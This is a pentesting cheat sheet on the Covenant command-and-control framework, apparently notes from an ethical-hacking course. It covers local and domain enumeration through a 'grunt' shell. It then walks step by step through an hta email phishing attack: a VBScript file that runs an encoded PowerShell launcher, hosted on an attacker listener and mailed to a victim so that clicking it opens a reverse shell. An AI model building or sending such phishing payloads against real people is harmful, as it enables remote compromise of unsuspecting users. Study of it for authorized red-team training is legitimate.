# Covenant

## Local Enumeration

- Suppose we have a grunt (a shell on the target) so we want to enumerate the target
- Click on the grunt > Interact
- Use Seatbelt `Seatbelt -group=all`
  - We will get useful info: local users, dns info (such as email domain and all), interesting files, etc.
- Use the cmd `GetDomainUser` to enumerate domain users
- Use the cmd `GetNetLoggedOnUser`to have a list of logged on users
- Use the cmd `GetNetLocalGroup` to have a list of local group
- etc.

## hta Email Phishing

- Create and hta file in your attacking machine:

```
<script language="VBScript">
  Function DoStuff()
    Dim wsh
    Set wsh = CreateObject("Wscript.Shell")
    wsh.run "<powershell command here>"
    Set wsh = Nothing
  End Function

  DoStuff
  self.close
</script>
```

- Create an HTTP listener in Covenant
  - Listener > create 
  - The table in listener should look like this  
    | Name        |    ListenerType | Status | StartTime	    |        ConnectAddresses   |   ConnectPort|
    |-------------|-----------------|--------|----------------|---------------------------|--------------|
    |HTTP Listener |	HTTP 	        |Active 	|3/7/2022 8:28:13 PM |	IP-OF-ATTACK-MACHINE 	    | 80

  - Go to Launchers > Powershell
  - Fill up the info, be careful taht the killdate is later in the future (not in the past)
  - Click on generate
  - Copy the encoded Launcher and put it in the script above instead of `<powershell command here>` 
  - Save the script
  - Go back to Listerners click on the listener that was just set up 
  - Go to Hosted Files, in Path enter `/name-of-your-script.hta`
  - Click on Browse and select your script
  - And click on create
  - If we go to `http://localhost/name-of-your-script.hta` we should be able to download it
- We can now send an email with a link to our reverse shell `http://IP-OF-ATTACK-MACHINE/name-of-your-script.hta`
- When the user will click the link an run the script we will get our reverse shell
- If we go to Covenant again and check in Grunt we should have a new one
- If you are not able to execute command (they stay Uninitialized) try either of those:  
  - Verify the kill date of the launcher
  - the UI may not allow changing the date.  This can be fixed by deleting the `/opt/Covenant/Covenant/data/covenant.db` file and restarting the service. You will lose all data and need to create a new user to log in with.

## Resources

- [Get Covenant here](https://github.com/cobbr/Covenant)
- [Movement Pivoting and Persistence - TCM Security Academy](https://academy.tcm-sec.com/p/movement-pivoting-and-persistence-for-pentesters-and-ethical-hackers)